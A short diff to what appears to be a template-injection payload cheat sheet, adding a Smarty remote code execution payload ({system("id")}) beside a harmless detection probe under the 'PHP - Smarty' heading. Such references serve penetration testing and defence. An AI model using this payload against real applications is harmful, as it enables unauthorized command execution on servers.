@@ -28,7 +28,10 @@
 
 ## PHP - Smarty
 
-### PoC Payload
+### PoC Enumeration Payload
 
     {'Hello'|upper}
   
+### RCE Payload
+
+    {system("id")}
